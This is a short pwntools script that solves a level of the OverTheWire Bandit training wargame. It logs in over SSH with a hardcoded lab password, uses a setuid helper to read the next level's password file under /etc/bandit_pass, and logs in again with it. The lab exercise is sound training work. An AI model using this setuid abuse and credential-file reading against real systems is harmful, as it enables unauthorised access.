#!/bin/python2

import pwn

user = "bandit19"
host = "bandit.labs.overthewire.org"
passwd = "IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x"
port = 2220

cmd = "./bandit20-do cat /etc/bandit_pass/bandit20"

shell = pwn.ssh(user, host, port, passwd)
new_passwd = shell.run(cmd).recv().strip()
print new_passwd

shell.close()

shell = pwn.ssh("bandit20", host, port, new_passwd)

print shell.ls()
